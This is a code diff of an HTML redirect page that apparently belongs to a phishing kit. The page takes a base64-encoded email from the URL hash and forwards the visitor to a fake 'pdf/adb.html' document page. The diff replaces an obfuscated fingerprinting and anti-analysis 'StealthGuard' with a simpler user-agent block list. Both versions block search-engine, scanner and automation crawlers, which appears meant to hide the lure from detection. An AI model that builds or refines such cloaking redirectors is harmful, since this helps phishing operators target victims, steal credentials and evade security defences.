@@ -48,12 +48,6 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    .hidden-test {
-      position: absolute;
-      left: -9999px;
-      opacity: 0;
-      pointer-events: none;
-    }
   </style>
 </head>
 <body>
@@ -63,390 +57,52 @@
     <div class="loader"></div>
   </div>
 
-  <!-- Hidden elements for bot detection -->
-  <div class="hidden-test" id="bot-trap">
-    <a href="/bot-detected">Bot Trap Link</a>
-    <input type="text" name="bot-field" value="">
-  </div>
-
   <script>
     (function () {
-      'use strict';
-
-      // Obfuscated strings
-      const obf = {
-        'redirect': atob('cmVkaXJlY3Q='),
-        'bot': atob('Ym90'),
-        'crawler': atob('Y3Jhd2xlcg=='),
-        'spider': atob('c3BpZGVy'),
-        'email': atob('ZW1haWw='),
-        'token': atob('dG9rZW4=')
-      };
-
-      // Advanced bot detection system
-      class StealthGuard {
-        constructor() {
-          this.botScore = 0;
-          this.checks = [];
-          this.startTime = Date.now();
-          this.userInteracted = false;
-          this.mouseEvents = 0;
-          this.keyEvents = 0;
-        }
-
-        // Enhanced user agent detection
-        checkUserAgent() {
-          const ua = navigator.userAgent.toLowerCase();
-          const botPatterns = [
-            /bot/i, /crawler/i, /spider/i, /crawling/i, /scraper/i,
-            /google/i, /bing/i, /yahoo/i, /facebook/i, /twitter/i,
-            /duckduckgo/i, /baidu/i, /yandex/i, /slurp/i,
-            /archiver/i, /extractor/i, /harvester/i, /monitor/i,
-            /phantom/i, /headless/i, /puppeteer/i, /selenium/i,
-            /webdriver/i, /automated/i, /test/i, /curl/i, /wget/i,
-            /python/i, /java/i, /node/i, /requests/i, /urllib/i,
-            /httpclient/i, /okhttp/i, /apache/i, /commons/i
-          ];
-          
-          const suspiciousPatterns = [
-            /^mozilla\/5\.0$/i,
-            /^mozilla\/4\.0$/i,
-            /windows nt 6\.1.*wow64.*rv:11\.0/i
-          ];
-
-          if (botPatterns.some(pattern => pattern.test(ua))) {
-            this.botScore += 50;
-          }
-          if (suspiciousPatterns.some(pattern => pattern.test(ua))) {
-            this.botScore += 30;
-          }
-          
-          // Check for missing or unusual UA components
-          if (!ua.includes('mozilla') || ua.length < 50) {
-            this.botScore += 25;
-          }
-        }
-
-        // Browser features detection
-        checkBrowserFeatures() {
-          const tests = [
-            () => typeof window.chrome !== 'undefined',
-            () => typeof window.InstallTrigger !== 'undefined', // Firefox
-            () => typeof window.safari !== 'undefined', // Safari
-            () => window.navigator.webdriver === undefined,
-            () => typeof window.outerHeight !== 'undefined',
-            () => typeof window.outerWidth !== 'undefined',
-            () => window.screen.width > 0 && window.screen.height > 0,
-            () => window.navigator.plugins.length > 0,
-            () => window.navigator.languages && window.navigator.languages.length > 0,
-            () => typeof window.requestAnimationFrame === 'function',
-            () => typeof window.localStorage !== 'undefined',
-            () => typeof window.sessionStorage !== 'undefined',
-            () => 'ontouchstart' in window || navigator.maxTouchPoints > 0
-          ];
-
-          const passedTests = tests.filter(test => {
-            try { return test(); } catch { return false; }
-          }).length;
-
-          if (passedTests < 8) {
-            this.botScore += 40;
-          }
-        }
-
-        // WebGL fingerprinting
-        checkWebGL() {
-          try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) {
-              this.botScore += 20;
-              return;
-            }
-
-            const renderer = gl.getParameter(gl.RENDERER);
-            const vendor = gl.getParameter(gl.VENDOR);
-            
-            // Bots often have generic or missing WebGL info
-            if (!renderer || !vendor || 
-                renderer.includes('SwiftShader') ||
-                renderer.includes('Microsoft Basic Render Driver') ||
-                vendor.includes('Google Inc.')) {
-              this.botScore += 15;
-            }
-          } catch {
-            this.botScore += 25;
-          }
-        }
-
-        // Canvas fingerprinting
-        checkCanvasFingerprint() {
-          try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            // Draw some text and shapes
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('BotDetection🤖', 2, 2);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillRect(100, 5, 80, 20);
-            
-            const fingerprint = canvas.toDataURL();
-            
-            // Bots often have identical canvas outputs
-            if (fingerprint.length < 5000) {
-              this.botScore += 20;
-            }
-            
-            // Store for comparison with known bot signatures
-            const hash = this.simpleHash(fingerprint);
-            const knownBotHashes = [123456789, 987654321]; // Add known bot hashes
-            if (knownBotHashes.includes(hash)) {
-              this.botScore += 50;
-            }
-          } catch {
-            this.botScore += 30;
-          }
-        }
-
-        // Simple hash function
-        simpleHash(str) {
-          let hash = 0;
-          for (let i = 0; i < str.length; i++) {
-            const char = str.charCodeAt(i);
-            hash = ((hash << 5) - hash) + char;
-            hash = hash & hash; // Convert to 32-bit integer
-          }
-          return hash;
-        }
-
-        // Screen and window checks
-        checkScreenProperties() {
-          const screen = window.screen;
-          const suspicious = [
-            screen.width === 0 || screen.height === 0,
-            screen.width === 1024 && screen.height === 768, // Common headless
-            screen.width === 1366 && screen.height === 768, // Common headless
-            screen.availWidth !== screen.width,
-            screen.colorDepth < 16,
-            typeof screen.orientation === 'undefined'
-          ];
-
-          const suspiciousCount = suspicious.filter(Boolean).length;
-          if (suspiciousCount >= 2) {
-            this.botScore += 25;
-          }
-        }
-
-        // Timing-based detection
-        checkTiming() {
-          const now = Date.now();
-          const timeSinceLoad = now - this.startTime;
-          
-          // Real users don't usually navigate instantly
-          if (timeSinceLoad < 500) {
-            this.botScore += 30;
-          }
-          
-          // Check JavaScript execution timing
-          const start = performance.now();
-          for (let i = 0; i < 1000; i++) {
-            Math.random();
-          }
-          const executionTime = performance.now() - start;
-          
-          // Bots often have different execution characteristics
-          if (executionTime < 0.1 || executionTime > 100) {
-            this.botScore += 15;
-          }
-        }
-
-        // Mouse and keyboard interaction tracking
-        trackUserInteraction() {
-          const self = this;
-          
-          ['mousedown', 'mousemove', 'click', 'scroll'].forEach(event => {
-            document.addEventListener(event, () => {
-              self.userInteracted = true;
-              self.mouseEvents++;
-            }, { once: true, passive: true });
-          });
-
-          ['keydown', 'keypress'].forEach(event => {
-            document.addEventListener(event, () => {
-              self.userInteracted = true;
-              self.keyEvents++;
-            }, { once: true, passive: true });
-          });
-        }
-
-        // Check for automation tools
-        checkAutomationTools() {
-          const automationIndicators = [
-            'webdriver' in window,
-            'callPhantom' in window,
-            'callSelenium' in window,
-            '_phantom' in window,
-            '__nightmare' in window,
-            'chrome' in window && 'runtime' in window.chrome && window.chrome.runtime.onConnect,
-            navigator.webdriver === true,
-            'domAutomation' in window,
-            'domAutomationController' in window
-          ];
-
-          if (automationIndicators.some(Boolean)) {
-            this.botScore += 60;
-          }
-        }
-
-        // Permission and sensor checks
-        async checkPermissionsAndSensors() {
-          // Check for unusual permission states
-          try {
-            if (navigator.permissions) {
-              const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
-              let suspiciousPermissions = 0;
-              
-              for (const perm of permissions) {
-                try {
-                  const result = await navigator.permissions.query({ name: perm });
-                  if (result.state === 'granted') {
-                    suspiciousPermissions++;
-                  }
-                } catch (e) {
-                  // Permission check failed
-                }
-              }
-              
-              // Too many permissions granted might indicate automation
-              if (suspiciousPermissions >= 3) {
-                this.botScore += 20;
-              }
-            }
-          } catch (e) {
-            this.botScore += 10;
-          }
-        }
-
-        // Run all detection methods
-        async runDetection() {
-          this.checkUserAgent();
-          this.checkBrowserFeatures();
-          this.checkWebGL();
-          this.checkCanvasFingerprint();
-          this.checkScreenProperties();
-          this.checkTiming();
-          this.checkAutomationTools();
-          this.trackUserInteraction();
-          await this.checkPermissionsAndSensors();
-
-          // Wait for user interaction or timeout
-          return new Promise((resolve) => {
-            const checkInterval = setInterval(() => {
-              const timeSinceStart = Date.now() - this.startTime;
-              
-              if (this.userInteracted || timeSinceStart > 3000) {
-                clearInterval(checkInterval);
-                
-                // Penalize for lack of user interaction
-                if (!this.userInteracted && timeSinceStart > 2000) {
-                  this.botScore += 40;
-                }
-                
-                resolve(this.botScore < 50);
-              }
-            }, 100);
-          });
-        }
+      // Bot detection
+      function isBotUserAgent() {
+        const bots = [
+          /bot/i, /crawler/i, /spider/i, /crawling/i,
+          /google/i, /bing/i, /yahoo/i, /facebook/i,
+          /duckduckgo/i, /baidu/i, /yandex/i
+        ];
+        return bots.some(bot => bot.test(navigator.userAgent));
       }
 
-      // Initialize stealth guard
-      const guard = new StealthGuard();
-
-      // Immediate basic checks
-      guard.runDetection().then(isHuman => {
-        if (!isHuman) {
-          document.getElementById('status').textContent = "Access blocked: automated system detected.";
-          document.querySelector('.loader').style.display = "none";
-          return;
-        }
-
-        // Proceed with original logic if human detected
-        proceedWithRedirect();
-      });
-
-      function proceedWithRedirect() {
-        // Get the Base64 email from the current URL (after the #)
-        const hash = window.location.hash;
-        let encodedEmail = hash.substring(1);
-
-        // Additional hash validation
-        if (!encodedEmail || encodedEmail.length < 10) {
-          document.getElementById('status').textContent = "Missing or invalid secure email token.";
-          document.querySelector('.loader').style.display = "none";
-          return;
-        }
-
-        // Validate base64 format
-        try {
-          atob(encodedEmail);
-        } catch (e) {
-          document.getElementById('status').textContent = "Invalid email token format.";
-          document.querySelector('.loader').style.display = "none";
-          return;
-        }
-
-        // Generate a strong random token with additional entropy
-        function generateSecureToken(length = 32) {
-          const array = new Uint8Array(length);
-          crypto.getRandomValues(array);
-          const timestamp = Date.now().toString(36);
-          const random = Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
-          return timestamp + random;
-        }
-
-        const token = generateSecureToken();
-        const sessionId = generateSecureToken(16);
-
-        // Add anti-replay protection
-        const nonce = btoa(Date.now() + Math.random().toString()).replace(/[^a-zA-Z0-9]/g, '');
-
-        // Build the redirect URL with additional security parameters
-        const redirectUrl = `pdf/adb.html#${obf.email}=${encodedEmail}&${obf.token}=${token}&session=${sessionId}&nonce=${nonce}&t=${Date.now()}`;
-
-        // Update status and redirect with random delay
-        document.getElementById('status').textContent = "Redirecting to secure content...";
-        
-        const redirectDelay = 1500 + Math.floor(Math.random() * 1000); // 1.5-2.5 seconds
-        
-        setTimeout(() => {
-          // Final check before redirect
-          if (guard.botScore < 30) {
-            window.location.replace(redirectUrl);
-          } else {
-            document.getElementById('status').textContent = "Security verification failed.";
-            document.querySelector('.loader').style.display = "none";
-          }
-        }, redirectDelay);
+      if (isBotUserAgent()) {
+        document.getElementById('status').textContent = "Access blocked: automated system detected.";
+        document.querySelector('.loader').style.display = "none";
+        return;
       }
 
-      // Additional protection: prevent common bot actions
-      document.addEventListener('contextmenu', e => e.preventDefault());
-      document.addEventListener('selectstart', e => e.preventDefault());
-      document.addEventListener('dragstart', e => e.preventDefault());
+      // Step 1: Get the Base64 email from the current URL (after the #)
+      var encodedEmail = window.location.hash.substring(1); // removes the '#'
 
-      // Detect if JavaScript is being analyzed
-      Object.defineProperty(window, 'toString', {
-        value: function() { guard.botScore += 25; return '[object Window]'; }
-      });
+      // Fallback if no hash is present
+      if (!encodedEmail) {
+        document.getElementById('status').textContent = "Missing secure email token.";
+        document.querySelector('.loader').style.display = "none";
+        return;
+      }
+
+      // Step 2: Generate a strong random token
+      function generateToken(length = 16) {
+        const array = new Uint8Array(length);
+        crypto.getRandomValues(array);
+        return Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
+      }
+      var token = generateToken();
+
+      // Step 3: Build the redirect URL
+      var redirectUrl = "pdf/adb.html#email=" + encodedEmail + "&token=" + token;
+
+      // Step 4: Update status and redirect
+      document.getElementById('status').textContent = "Redirecting...";
+      setTimeout(() => {
+        window.location.replace(redirectUrl);
+      }, 1500);
 
     })();
   </script>
-
-  <!-- Additional bot trap -->
-  <noscript>
-    <meta http-equiv="refresh" content="0;url=about:blank">
-  </noscript>
 </body>
 </html>
